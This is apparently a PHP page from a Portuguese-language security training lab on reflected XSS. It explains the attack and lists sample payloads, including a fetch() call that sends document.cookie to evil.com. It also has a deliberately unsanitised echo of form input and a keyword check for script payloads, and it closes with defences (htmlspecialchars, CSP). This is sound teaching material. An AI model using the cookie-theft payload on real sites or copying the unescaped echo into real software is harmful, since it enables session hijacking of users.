<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header("Location: ../login.php");
    exit;
}
require_once '../db/conexao.php';

$user_id = $_SESSION['user_id'];

// Busca o ID do lab de XSS
$lab_res = $conn->query("SELECT id FROM labs WHERE categoria = 'XSS' LIMIT 1");
$lab     = $lab_res->fetch_assoc();
$lab_id  = $lab['id'] ?? 2;

// Verifica se já completou
$check = $conn->prepare("SELECT id FROM progresso WHERE usuario_id = ? AND lab_id = ?");
$check->bind_param("ii", $user_id, $lab_id);
$check->execute();
$ja_completou = $check->get_result()->num_rows > 0;

// ─── ZONA VULNERÁVEL ─────────────────────────────────────────────────────────
// Campo de comentário PROPOSITALMENTE vulnerável a XSS Refletido.
$vuln_input    = null;
$xss_detectado = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comentario'])) {
    // ⚠️ SEM htmlspecialchars — reflete o input diretamente
    $vuln_input = $_POST['comentario'];

    // Detecta se o usuário enviou um payload de script (para registrar conclusão)
    if (stripos($vuln_input, '<script') !== false || stripos($vuln_input, 'onerror') !== false
        || stripos($vuln_input, 'onload') !== false || stripos($vuln_input, 'javascript:') !== false) {
        $xss_detectado = true;

        if (!$ja_completou) {
            $ins = $conn->prepare("INSERT INTO progresso (usuario_id, lab_id) VALUES (?, ?)");
            $ins->bind_param("ii", $user_id, $lab_id);
            $ins->execute();
            $ja_completou = true;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>XSS — CyberSec Dojo</title>
    <link rel="stylesheet" href="../CSS/dashboard.css">
</head>
<body>

<nav class="navbar">
    <div class="navbar-brand">Cyber<span>Sec</span> Dojo</div>
    <div class="navbar-user">
        <span><strong><?= htmlspecialchars($_SESSION['username'], ENT_QUOTES, 'UTF-8') ?></strong></span>
        <a href="index.php" class="btn-logout">← Labs</a>
        <a href="../logout.php" class="btn-logout">Sair</a>
    </div>
</nav>

<div class="lab-content">

    <!-- CABEÇALHO -->
    <div class="page-header">
        <h1>Cross-Site Scripting</h1>
        <p>Entenda o ataque, analise os payloads e injete código no campo vulnerável abaixo.</p>
    </div>

    <!-- SEÇÃO 1: O QUE É XSS -->
    <div class="lab-section">
        <h2>O que é XSS?</h2>
        <p>
            Cross-Site Scripting (XSS) é uma vulnerabilidade que permite a injeção de scripts
            maliciosos em páginas web visualizadas por outros usuários. Diferente do SQLi, o XSS
            não ataca o servidor — ele ataca o <strong>navegador da vítima</strong>.
        </p>
        <p>
            O ataque funciona quando uma aplicação inclui dados fornecidos pelo usuário no HTML
            da resposta sem sanitizá-los. O navegador não distingue script legítimo de script
            injetado — executa os dois.
        </p>
        <p>
            Existem três tipos principais: <strong>Refletido</strong> (o payload vai na URL ou
            formulário e é refletido de volta na resposta imediata), <strong>Armazenado</strong>
            (o payload é salvo no banco e executado toda vez que a página é carregada) e
            <strong>DOM-based</strong> (manipulação do DOM via JavaScript do lado cliente).
            Este lab demonstra XSS Refletido.
        </p>
    </div>

    <!-- SEÇÃO 2: PAYLOADS -->
    <div class="lab-section">
        <h2>Payloads e o que fazem</h2>

        <div class="command-block xss-block">
            <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
            <p class="cmd-desc">
                <strong>Payload clássico de prova de conceito.</strong> Injeta uma tag script diretamente
                no HTML. O navegador executa o JavaScript e exibe um alert. Se você vê o popup, a
                vulnerabilidade é confirmada. É o payload mais básico para testar se um campo é vulnerável.
            </p>
        </div>

        <div class="command-block xss-block">
            <code>&lt;img src=x onerror="alert('XSS')"&gt;</code>
            <p class="cmd-desc">
                <strong>XSS via atributo de evento.</strong> Cria uma imagem com src inválido ("x"),
                que força o evento onerror a disparar. Útil quando tags script são filtradas mas
                atributos de evento HTML não são. O código JavaScript roda no evento de erro da imagem.
            </p>
        </div>

        <div class="command-block xss-block">
            <code>&lt;script&gt;document.cookie&lt;/script&gt;</code>
            <p class="cmd-desc">
                <strong>Leitura de cookies de sessão.</strong> Em sistemas sem httponly nos cookies,
                esse payload exibe (ou pode enviar para um servidor externo) os cookies da vítima —
                incluindo o session token. Um atacante real substituiria alert() por um fetch() para
                seu servidor, roubando a sessão.
            </p>
        </div>

        <div class="command-block xss-block">
            <code>&lt;svg onload="alert('XSS')"&gt;</code>
            <p class="cmd-desc">
                <strong>XSS via SVG.</strong> Tags SVG executam JavaScript via evento onload.
                Contorna filtros que bloqueiam apenas tags script e img. Muito usado quando
                o site aceita conteúdo que parece inofensivo (como SVGs para upload de imagens).
            </p>
        </div>

        <div class="command-block xss-block">
            <code>&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</code>
            <p class="cmd-desc">
                <strong>Exfiltração de dados (ataque real).</strong> Envia silenciosamente os cookies
                da vítima para um servidor controlado pelo atacante. Em uma aplicação sem httponly,
                isso resultaria em sequestro de sessão — o atacante se autenticaria como a vítima
                sem precisar da senha.
            </p>
        </div>
    </div>

    <!-- BOTÃO DE ANCORAGEM -->
    <div style="text-align: center; margin: 10px 0 20px;">
        <a href="#zona-xss" class="btn-test xss">↓ Ir para o desafio</a>
    </div>

    <!-- ZONA VULNERÁVEL -->
    <div class="vuln-zone" id="zona-xss">
        <div class="vuln-zone-header">
            <h2>Campo Vulnerável — XSS Refletido</h2>
            <span class="warning-badge">⚠ INTENCIONALMENTE INSEGURO</span>
        </div>
        <p class="desc">
            Este campo reflete o input diretamente no HTML sem sanitização.
            Injete um payload de script e observe o comportamento do navegador.
        </p>

        <?php if ($ja_completou && !$xss_detectado): ?>
            <div class="result-box result-success show">
                ✓ Você já completou este laboratório anteriormente.
            </div>
        <?php endif; ?>

        <?php if ($xss_detectado): ?>
            <div class="result-box result-success show">
                ✓ Payload detectado! XSS executado com sucesso. Lab registrado no seu progresso.
            </div>
        <?php endif; ?>

        <form action="xss.php#zona-xss" method="POST" class="vuln-form" style="margin-top: 20px;">
            <div class="form-group">
                <label>Comentário</label>
                <textarea name="comentario" placeholder='tente: &lt;script&gt;alert("XSS")&lt;/script&gt;'></textarea>
            </div>
            <button type="submit" class="btn-vuln">Enviar Comentário</button>
        </form>

        <?php if ($vuln_input !== null): ?>
            <div style="margin-top: 24px; padding: 16px; background: var(--bg); border: 1px solid var(--border); border-radius: 3px;">
                <div style="font-family: var(--mono); font-size: 10px; color: var(--muted); margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px;">
                    Output refletido (sem sanitização):
                </div>
                <!-- ⚠️ INTENCIONAL: echo sem htmlspecialchars para demonstrar XSS -->
                <div id="output-vuln"><?= $vuln_input ?></div>
            </div>
        <?php endif; ?>
    </div>

    <!-- DEFESA -->
    <div class="lab-section" style="margin-top: 48px;">
        <h2>Como se defender</h2>
        <p>
            A defesa principal contra XSS é o <strong>output encoding</strong>: converter
            caracteres especiais HTML antes de exibi-los. A função <code>htmlspecialchars()</code>
            do PHP transforma <em>&lt;</em> em <em>&amp;lt;</em>, impedindo que o navegador
            interprete o conteúdo como tag HTML.
        </p>
        <div class="command-block xss-block">
            <code>echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');</code>
            <p class="cmd-desc">
                Com isso, <em>&lt;script&gt;alert('XSS')&lt;/script&gt;</em> é exibido como texto
                literal na tela — o navegador nunca o executa como código. Sempre use ENT_QUOTES
                para cobrir aspas simples e duplas, e especifique UTF-8 como charset.
            </p>
        </div>
        <p>
            Além do output encoding, o cabeçalho <strong>Content-Security-Policy (CSP)</strong>
            restringe quais scripts podem executar na página, adicionando uma camada extra de defesa
            mesmo que algum output escape a sanitização.
        </p>
    </div>

</div>
</body>
</html>
